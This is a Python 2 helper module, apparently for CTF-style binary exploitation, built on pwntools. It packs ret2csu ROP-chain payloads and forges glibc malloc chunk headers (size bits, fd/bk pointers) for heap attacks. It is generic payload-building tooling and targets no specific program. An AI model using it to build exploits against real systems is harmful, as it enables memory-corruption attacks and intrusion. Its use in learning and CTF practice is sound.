from pwnlib.util.packing import p64
from pwnlib.util.packing import pack

class Csu64:
    def __init__(self, addr):
        self.addr = addr
        self.edi = 0
        self.rsi = 0
        self.rdx = 0
        self.rbp = 0
        self.target = 0

    def __str__(self, count=1):
        if self.rbp == 0:
            self.rbp = count
        payload = p64(self.addr)
        payload += p64(0) + p64(self.rbp)
        payload += p64(self.target)
        payload += p64(self.edi) + p64(self.rsi)
        payload += p64(self.rdx)
        payload += p64(self.addr - 0x1a)

        return payload

    def __add__(self, src):
        return str(self) + str(src)


class Chunk:
    def __init__(self, word):
        self.word = word
        self.prev_size = 0
        self.size = -1
        self.norm_size = -1
        self.A = 0
        self.M = 0
        self.P = 1
        self.fd = 0
        self.bk = 0
        self.fd_nextsize = 0
        self.bk_nextsize = 0
        self.SIZE_SZ = word / 8
        self.MALLOC_ALIGNMENT = 2 * self.SIZE_SZ
        self.MALLOC_ALIGN_MASK = self.MALLOC_ALIGNMENT - 1
        self.MIN_CHUNK_SIZE = 4 * self.SIZE_SZ
        self.MINSIZE = (self.MIN_CHUNK_SIZE + self.MALLOC_ALIGN_MASK) & (~self.MALLOC_ALIGN_MASK)
        

    def request2size(self, req):
        out = req + self.SIZE_SZ + self.MALLOC_ALIGN_MASK
        if out < self.MINSIZE:
            return self.MINSIZE
        else:
            res = out & (~self.MALLOC_ALIGN_MASK)
            return res

    # this does not include prev_size
    def userSize(self, req):
        padded = self.request2size(req)
        return padded - 2 * self.SIZE_SZ

    @staticmethod
    def setBit(num, idx, bit):
        mask = bit << idx
        num = num | mask
        return num

    def __str__(self):
        pword = lambda x : pack(x, self.word, 'little', False)
        payload = pword(self.prev_size)
        if self.size == -1:
            assert self.norm_size >= 0
            self.size = self.setBit(self.norm_size, 0, self.P)
            self.size = self.setBit(self.size, 1, self.M)
            self.size = self.setBit(self.size, 2, self.A)
            
        payload += pword(self.size)
        payload += pword(self.fd) + pword(self.bk)
        payload += pword(self.fd_nextsize) + pword(self.bk_nextsize)
        self.size = -1
        return payload

    def __getitem__(self, key):
        if isinstance(key, slice):
            string = str(self)
            start = self.SIZE_SZ * key.start
            stop = self.SIZE_SZ * key.stop
            return string[start:stop]
        else:
            print "Not Supported."
            return None
        
